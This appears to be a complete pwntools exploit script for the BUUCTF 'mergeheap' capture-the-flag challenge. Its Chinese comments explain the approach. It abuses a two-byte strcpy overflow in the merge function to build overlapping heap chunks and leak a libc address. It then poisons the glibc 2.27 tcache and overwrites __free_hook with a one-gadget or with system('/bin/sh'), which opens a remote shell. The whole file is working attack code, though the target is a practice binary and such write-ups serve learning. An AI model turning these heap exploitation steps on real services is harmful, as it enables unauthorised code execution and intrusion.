#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 25043
elfpath = 'mergeheap_patched'
ldpath = 'ld-2.27.so'
libcpath = 'libc-2.27.so'
e = ELF(elfpath)
context.binary = e
libc = ELF(libcpath)

context.binary = e

if args.LOCAL:
    p = process([e.path])
    # gdb.attach(p)
else:
    p = remote(host, port)

# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def rn(n): return p.recvn(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success("{} ==> {}".format(func, hex(address)))


def command(c):
    ru(b'>>')
    sl(str(c).encode())


def add(size, content):
    command(1)
    ru(b'len:')
    sl(str(size).encode())
    ru(b'content:')
    sl(content)

# def edit(index, size, content):


def free(index):
    command(3)
    ru(b'idx:')
    sl(str(index).encode())


def show(index):
    command(2)
    ru(b'idx:')
    sl(str(index).encode())


def merge(index1, index2):
    command(4)
    ru(b'idx1:')
    sl(str(index1).encode())
    ru(b'idx2:')
    sl(str(index2).encode())


# start pwning
'''
checksec保护全开
glibc2.27，意味着存在初始版本的tcache机制
add chunk size 范围：[0, 0x400]，都处于tcache范围内

漏洞点：
strcpy遇到\x00才会停止，所以在merge的时候存在最多两字节的溢出

思路：
泄露libc基址
然后free_hook改写为onegadget
'''

def pwn1():
    '''
    https://www.bbsmax.com/A/n2d9PB9B5D/
    '''
    add(0x30, b'a'*0x30)  # 0
    add(0x38, b'b'*0x38)  # 1
    add(0x100, b'c'*0x10) # 2
    add(0x400, b'd'*0x10) # 3
    add(0x200, b'e'*0x10) # 4
    add(0x68, b'f'*0x68)  # 5
    add(0x20, b'')        # 6
    add(0x20, b'')        # 7
    add(0x20, b'')        # 8
    add(0x20, b'')        # 9
    free(7)
    free(8)
    merge(3,4) # id 7

    # gdb.attach(p)

    add(0xa8, b'g'*0x68) # id 8
    free(7)
    free(5)
    merge(0, 1) # id 5
    add(0x30, b'a'*0x10) # id 7
    free(6)
    add(0x100, b'a'*0xff+b'Q') # id 6
    show(6)
    ru(b'Q')
    leaked_addr = u64(ru(b'\n', drop=True).ljust(8, b'\x00'))
    libc_base = leaked_addr - 0x3ebca0
    leak("libc base", libc_base)
    free(6)
    target = libc_base + libc.sym['__free_hook'] - 0x13
    onegadgets = [0x4f2c5, 0x4f322, 0x10a38c]

    add(0x100, b'a'*0x60+p64(target)+p64(0))
    add(0x20, b'')
    add(0x20, b'a'*0x13+p64(libc_base + onegadgets[1]))
    free(0)
    shell()

def pwn2():
    '''
    https://shizhongpwn.github.io/2020/01/30/2020-heap-practice/
    '''
    # 先消耗掉tcache
    for i in range(8):
        add(0x100, b'a'*0x10)
    for i in range(8):
        free(7-i)
    # 此时，0x110对应的tcache bin被填满，然后 id 0 的堆块进入了unsorted bin中，大小为0x110
    # gdb.attach(p)
    # 利用unsorted bin泄露libc
    add(0x8, b'a'*8) # 这里的8字节大小的chunk申请会使得unsorted bin中的chunk 0被切割

    show(0)
    leaked_addr = u64(ru7f()[-6:].ljust(8, b'\x00'))
    leak("addr", leaked_addr)

    # malloc_hook = leaked_addr - 0x70
    # libc_base = malloc_hook - libc.sym['__malloc_hook']
    libc_base = leaked_addr - (0x00007fe360fe9da0 - 0x7fe360bfe000)
    leak("libc base", libc_base)

    # 完成泄露之后开始实现任意地址写
    add(0xe0, b'a'*0xe0) # 1
    add(0x10, b'b'*0x10) # 2
    add(0x18, b'c'*0x18) # 3
    add(0x80, b'a')      # 4
    add(0x20, b'b')      # 5
    add(0x20, b'c')      # 6

    free(5)
    merge(2,3) # 5，chunk 6的size被改写为了0x91，造成堆块重叠
    add(0x20, b'd'*8) # 7
    free(6)
    free(7)

    free_hook = libc_base + libc.sym['__free_hook']
    system_addr = libc_base + libc.sym['system']
    payload = b'a'*0x20 + p64(0) + p64(0x31) + p64(free_hook)

    add(0x80, payload) # 6，改写tcache[0x30]中的chunk的next指针为free_hook
    add(0x20, b'/bin/sh\x00') # 7
    add(0x20, p64(system_addr)) # 8，位于free_hook处，将free_hook指针改为system函数地址
    free(7) # system("/bin/sh")
    shell()

pwn2()